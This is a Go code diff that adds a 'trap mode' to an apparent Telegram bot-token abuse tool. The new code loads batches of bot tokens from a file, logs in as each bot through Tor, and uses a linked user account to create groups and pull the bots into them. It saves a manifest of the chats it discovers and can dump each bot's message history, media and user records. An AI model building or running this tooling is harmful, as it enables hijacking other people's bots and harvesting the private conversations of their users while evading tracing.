@@ -16,7 +16,7 @@ import (
 	"golang.org/x/net/proxy"
 )
 
-const VERSION = "v3-2026-01-22-13-10"
+const VERSION = "v4-2026-04-16-trap"
 
 func main() {
 	exePath, _ := os.Executable()
@@ -41,18 +41,26 @@ func main() {
 		cancel()
 	}()
 
-	if err := runNormalMode(ctx, cfg); err != nil {
-		if err == context.Canceled {
-			fmt.Println("Shutdown complete")
-			return
+	if cfg.TrapEnabled {
+		if err := runTrapMode(ctx, cfg); err != nil {
+			fmt.Fprintf(os.Stderr, "Trap mode error: %v\n", err)
+			os.Exit(1)
 		}
-		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
-		os.Exit(1)
+	} else {
+		if err := runNormalMode(ctx, cfg); err != nil {
+			if err == context.Canceled {
+				fmt.Println("Shutdown complete")
+				return
+			}
+			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
+			os.Exit(1)
+		}
 	}
 }
 
 // ── helpers ──────────────────────────────────────────────────────────
 
+// makeTorResolver returns a DCS resolver through Tor, or nil + error
 func makeTorResolver() (dcs.Resolver, error) {
 	socks5Dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
 	if err != nil {
@@ -63,6 +71,154 @@ func makeTorResolver() (dcs.Resolver, error) {
 		return nil, fmt.Errorf("SOCKS5 dialer does not support ContextDialer")
 	}
 	return dcs.Plain(dcs.PlainOptions{Dial: contextDialer.DialContext}), nil
+}
+
+// ── TRAP MODE ───────────────────────────────────────────────────────
+
+func runTrapMode(ctx context.Context, cfg *Config) error {
+	PrintTrapBanner()
+
+	// Collect bot tokens
+	var tokens []string
+	if cfg.TokensFile != "" {
+		t, err := LoadTokensFromFile(cfg.TokensFile)
+		if err != nil {
+			return fmt.Errorf("failed to load tokens file: %w", err)
+		}
+		tokens = append(tokens, t...)
+		fmt.Printf("[TRAP] Loaded %d bot tokens from %s\n", len(t), cfg.TokensFile)
+	}
+	if cfg.Token != "" {
+		tokens = append(tokens, cfg.Token)
+	}
+	if len(tokens) == 0 {
+		return fmt.Errorf("no bot tokens provided")
+	}
+	fmt.Printf("[TRAP] Processing %d bot token(s) in '%s' mode\n", len(tokens), cfg.TrapMode)
+
+	// User client for group creation / bot invitation
+	appCfg := &UserAppConfig{
+		Phone:   cfg.Phone,
+		ApiID:   cfg.ApiID,
+		ApiHash: cfg.ApiHash,
+	}
+	userAuth := NewUserAuth(appCfg, cfg.UseTor)
+	userClient := userAuth.CreateClient()
+
+	return userClient.Run(ctx, func(ctx context.Context) error {
+		userAPI, err := userAuth.Authenticate(ctx)
+		if err != nil {
+			return fmt.Errorf("user authentication failed: %w", err)
+		}
+
+		// Print who we are
+		me, err := userAPI.UsersGetFullUser(ctx, &tg.InputUserSelf{})
+		if err != nil {
+			return fmt.Errorf("failed to get user info: %w", err)
+		}
+		if len(me.Users) > 0 {
+			if user, ok := me.Users[0].(*tg.User); ok {
+				fmt.Printf("[TRAP] User account: %s %s (@%s, ID: %d)\n",
+					user.FirstName, user.LastName, user.Username, user.ID)
+			}
+		}
+
+		trapCfg := &TrapConfig{
+			Enabled:       true,
+			Mode:          TrapMode(cfg.TrapMode),
+			SharedGroupID: cfg.TrapGroupID,
+			GroupTitle:     cfg.TrapGroupPrefix,
+		}
+
+		for i, token := range tokens {
+			fmt.Printf("\n[TRAP] === Bot %d/%d ===\n", i+1, len(tokens))
+
+			if err := processBotTrap(ctx, cfg, userAPI, trapCfg, token); err != nil {
+				fmt.Printf("[TRAP] Error processing bot token %d: %v\n", i+1, err)
+				continue
+			}
+
+			if i < len(tokens)-1 {
+				fmt.Printf("[TRAP] Waiting 2s before next bot...\n")
+				select {
+				case <-ctx.Done():
+					return ctx.Err()
+				case <-time.After(2 * time.Second):
+				}
+			}
+		}
+
+		fmt.Printf("\n[TRAP] ============================================================\n")
+		fmt.Printf("[TRAP] All %d bots processed\n", len(tokens))
+		fmt.Printf("[TRAP] ============================================================\n")
+		return nil
+	})
+}
+
+func processBotTrap(ctx context.Context, cfg *Config, userAPI *tg.Client, trapCfg *TrapConfig, botToken string) error {
+	botIDStr := strings.Split(botToken, ":")[0]
+
+	botOpts := telegram.Options{}
+	if cfg.UseTor {
+		resolver, err := makeTorResolver()
+		if err != nil {
+			return err
+		}
+		botOpts.Resolver = resolver
+	}
+
+	botClient := telegram.NewClient(cfg.ApiID, cfg.ApiHash, botOpts)
+
+	return botClient.Run(ctx, func(ctx context.Context) error {
+		if _, err := botClient.Auth().Bot(ctx, botToken); err != nil {
+			return fmt.Errorf("failed to authenticate bot %s: %w", botIDStr, err)
+		}
+
+		botAPI := tg.NewClient(botClient)
+		rateLimiter := DefaultRateLimiter()
+
+		basePath := fmt.Sprintf("trap_%s", botIDStr)
+		os.MkdirAll(basePath, 0755)
+		storage := NewStorage(basePath)
+
+		trap := NewTrapOrchestrator(userAPI, trapCfg, rateLimiter, storage)
+		trap.SetBotAPI(botAPI)
+
+		if err := trap.RunTrapMode(ctx, botToken, cfg.MaxMsgID, cfg.Lookahead); err != nil {
+			return fmt.Errorf("trap mode failed for bot %s: %w", botIDStr, err)
+		}
+
+		if err := trap.SaveDiscoveredChatsManifest(botIDStr); err != nil {
+			fmt.Printf("[TRAP] Warning: failed to save chats manifest: %v\n", err)
+		}
+
+		if cfg.DumpAndForward {
+			fmt.Printf("[TRAP] Running normal dump for bot %s...\n", botIDStr)
+			dumpBasePath := botIDStr
+			os.MkdirAll(dumpBasePath, 0755)
+			dumpStorage := NewStorage(dumpBasePath)
+			mediaHandler := NewMediaHandler(dumpStorage, botAPI, rateLimiter, cfg.ExcludeExts)
+			userHandler := NewUserHandler(dumpStorage, botAPI, rateLimiter)
+			msgProcessor := NewMessageProcessor(dumpStorage, mediaHandler, userHandler,
+				mustParseInt64(botIDStr), cfg.OutputFileHandle)
+
+			dumper := &Dumper{
+				api:          botAPI,
+				storage:      dumpStorage,
+				mediaHandler: mediaHandler,
+				userHandler:  userHandler,
+				msgProcessor: msgProcessor,
+				botID:        mustParseInt64(botIDStr),
+				rateLimiter:  rateLimiter,
+			}
+
+			if err := dumper.GetChatHistory(ctx, 200, 0, cfg.Lookahead); err != nil {
+				fmt.Printf("[TRAP] Warning: normal dump failed: %v\n", err)
+			}
+		}
+
+		return nil
+	})
 }
 
 // ── NORMAL MODE ─────────────────────────────────────────────────────
